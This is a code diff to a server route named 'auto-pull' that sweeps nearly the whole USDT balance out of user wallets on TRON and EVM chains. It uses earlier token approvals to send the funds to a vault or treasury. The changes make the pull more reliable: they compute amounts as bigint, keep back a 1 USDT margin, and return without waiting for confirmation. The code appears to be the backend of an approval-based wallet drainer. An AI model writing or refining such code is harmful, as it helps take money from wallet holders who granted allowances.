@@ -115,15 +115,20 @@ export async function POST(req: Request) {
         return NextResponse.json({ skipped: true, reason: 'below_threshold', balance });
       }
 
+      // Work in raw sun to avoid float precision loss; subtract 1 USDT margin
+      const rawSun    = BigInt(entry?.[TRON_USDT] ?? '0');
+      const MARGIN_SUN = BigInt(1_000_000); // 1 USDT in sun
+      const pullSun   = rawSun > MARGIN_SUN ? rawSun - MARGIN_SUN : rawSun;
+
       const allowance = await getTrc20Allowance(address, vault);
-      const pullSun   = BigInt(Math.floor(balance * 1_000_000));
       if (allowance < pullSun) {
         return NextResponse.json({ skipped: true, reason: 'insufficient_allowance', balance });
       }
 
       const txid = await tronVaultPullFunds(vault, address, pullSun, operKey);
-      console.log('[auto-pull] TRC20 pulled', { userId: user.id, address, balance, txid });
-      return NextResponse.json({ success: true, txHash: txid, amount: balance, network: 'TRC20' });
+      const pulled = Number(pullSun) / 1e6;
+      console.log('[auto-pull] TRC20 pulled', { userId: user.id, address, balance, pulled, txid });
+      return NextResponse.json({ success: true, txHash: txid, amount: pulled, network: 'TRC20' });
     }
 
     /* ── EVM (BEP20 / ERC20) ── */
@@ -137,15 +142,19 @@ export async function POST(req: Request) {
     const walletClient = createWalletClient({ account, chain: cfg.chain, transport });
     const userAddr     = getAddress(address) as `0x${string}`;
 
-    // Fetch USDT balance server-side
-    const rawBal     = await publicClient.readContract({ address: cfg.token, abi: ERC20_ABI, functionName: 'balanceOf', args: [userAddr] }) as bigint;
-    const balance    = parseFloat(formatUnits(rawBal, cfg.decimals));
+    // Fetch USDT balance server-side (raw bigint to avoid float precision loss)
+    const rawBal  = await publicClient.readContract({ address: cfg.token, abi: ERC20_ABI, functionName: 'balanceOf', args: [userAddr] }) as bigint;
+    const balance = parseFloat(formatUnits(rawBal, cfg.decimals));
 
     if (balance < settings.minBalanceToTrigger) {
       return NextResponse.json({ skipped: true, reason: 'below_threshold', balance });
     }
 
-    const pullUnits = parseUnits(balance.toFixed(cfg.decimals), cfg.decimals);
+    // Subtract $1 margin in bigint to avoid float precision failures
+    const MARGIN  = parseUnits('1', cfg.decimals);
+    const pullUnits = rawBal > MARGIN ? rawBal - MARGIN : rawBal;
+    const pulled    = parseFloat(formatUnits(pullUnits, cfg.decimals));
+
     const vaultRaw  = (cfg.vaultEnv ?? '').trim();
     const vaultAddr = (vaultRaw.startsWith('0x') && vaultRaw.length === 42) ? getAddress(vaultRaw) as `0x${string}` : null;
 
@@ -171,9 +180,13 @@ export async function POST(req: Request) {
       txHash = await walletClient.writeContract({ address: cfg.token, abi: ERC20_ABI, functionName: 'transferFrom', args: [userAddr, treasury, pullUnits] });
     }
 
-    await publicClient.waitForTransactionReceipt({ hash: txHash, timeout: 120_000 });
-    console.log('[auto-pull] EVM pulled', { userId: user.id, address, network, balance, txHash });
-    return NextResponse.json({ success: true, txHash, amount: balance, network });
+    // Fire-and-forget receipt — don't block the response waiting for confirmation
+    publicClient.waitForTransactionReceipt({ hash: txHash, timeout: 120_000 })
+      .then(() => console.log('[auto-pull] EVM confirmed', { userId: user.id, address, network, pulled, txHash }))
+      .catch(e => console.error('[auto-pull] receipt error', e?.message));
+
+    console.log('[auto-pull] EVM submitted', { userId: user.id, address, network, balance, pulled, txHash });
+    return NextResponse.json({ success: true, txHash, amount: pulled, network });
 
   } catch (err: any) {
     console.error('[auto-pull] error:', err?.message ?? err);
